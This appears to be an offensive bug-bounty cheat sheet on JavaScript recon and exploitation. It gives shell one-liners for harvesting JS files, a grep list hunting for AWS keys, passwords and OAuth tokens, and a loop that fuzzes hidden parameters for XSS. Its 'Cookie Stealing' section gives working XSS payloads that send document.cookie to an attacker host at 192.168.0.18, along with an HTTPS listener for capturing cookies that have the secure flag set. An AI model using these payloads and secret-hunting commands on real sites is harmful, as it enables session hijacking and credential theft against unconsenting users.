# JavaScript

## Find JavaScript files by gau and httpx

* [gau](https://github.com/lc/gau)
* [httpx](https://github.com/projectdiscovery/httpx)
```bash
echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

```


## Find and Extract JS file
```bash
# method 1
waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt

# method 2
subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt

```


## Extract API endpoints from JavaScript files
```bash
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u

```

## Searching in JavaScript files
```bash
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" /path/to/directory/*.js

```
> Make sure to replace `/path/to/directory` with the actual path to the directory where your .js files are located. The command will recursively search for the specified keywords in all .js files within that directory.



## Find hidden GET parameters in JavaScript files
Here’s an interesting tip for finding hidden parameters by analyzing javascript files:

1. Scour javascript files for variable names, e.g.:
  `var test = "xxx"`

2. Try each of them as a GET parameter to uncover hidden parameters, e.g.:
  `https://example.com/?test=”xsstest`

**This often results in XSS!**
```bash
assetfinder target.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done

```


## Cookie Stealing
(Note: `HttpOnly` should not be enabled/present in cookie header)

**1. Classic way**
```javascript
<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>

```
* **<img> Tag and Without the Infinite Loop**

This one works and will only steal the cookie once.
```javascript
<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">

```
* **<img> Tag Instead of <script> Tags**
Don't use this one! It works but calls `onerror()` in a loop, filling up your stolen cookie log.
```javascript
<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>

```

* ***Run the Cookie Stealer Python Script***

You'll need a place to capture the stolen cookies. [lnxg33k](https://github.com/lnxg33k) has written an excellent Python script called [XSS-cookie-stealer.py](https://github.com/Mehdi0x90/Scripts/blob/main/Python/XSS-cookie-stealer.py). Run it with Python 2.6 or higher. It is just an HTTP server which logs each inbound HTTP connection and all the cookies contained in that connection.
```bash
# Run script
python XSS-cookie-stealer.py

# The resulting output, at minimum, will be this
Started http server


```

**2. Bypassing secure flag protection**
* Generating certificate
```bash
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes

```
* Creating a HTTPS server
```python
#!/usr/bin/python3
import http.server, ssl
server_address = ('0.0.0.0', 443)
httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem')
"""ssl_version=ssl.PROTOCOL_TLSv1_2)
"""
httpd.serve_forever()

```
* Via XHR
```javascript
var xhr=new XMLHttpRequest(); 
xhr.open("GET", "https://192.168.0.18/?"+document.cookie, true); 
xhr.send();

```




